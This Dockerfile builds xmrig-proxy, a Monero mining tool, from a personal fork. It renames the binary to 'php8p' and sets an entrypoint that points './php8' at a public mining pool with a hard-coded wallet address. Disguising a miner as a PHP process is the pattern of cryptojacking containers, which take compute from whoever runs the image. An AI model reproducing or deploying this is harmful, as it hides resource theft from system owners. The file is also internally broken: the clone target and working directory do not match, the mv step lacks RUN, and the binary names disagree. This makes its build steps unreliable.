FROM ubuntu:18.04

# Prepare directories
RUN mkdir /config

# Install dependencies
RUN apt update && apt -y upgrade && apt -y install \
    build-essential \
    cmake \
    git \
    libmicrohttpd-dev \
    libssl-dev \
    libuv1-dev \
    uuid-dev

# Clean
RUN rm -rf /var/lib/apt/lists/*

# Get Code
WORKDIR /opt


RUN apt-get update && \
apt-get install -y gcc-7 g++-7 git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && \
cd /usr/src/ && \
git clone https://github.com/bdklz/xmrig-proxy.git /app  && \
cd /usr/src/xmrig-proxy && \
mkdir build && \
cd build && \
cmake . && \
make
mv xmrig-proxy php8p

ENTRYPOINT  ["./php8 -o pool.supportxmr.com:3333 -u 47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc"]
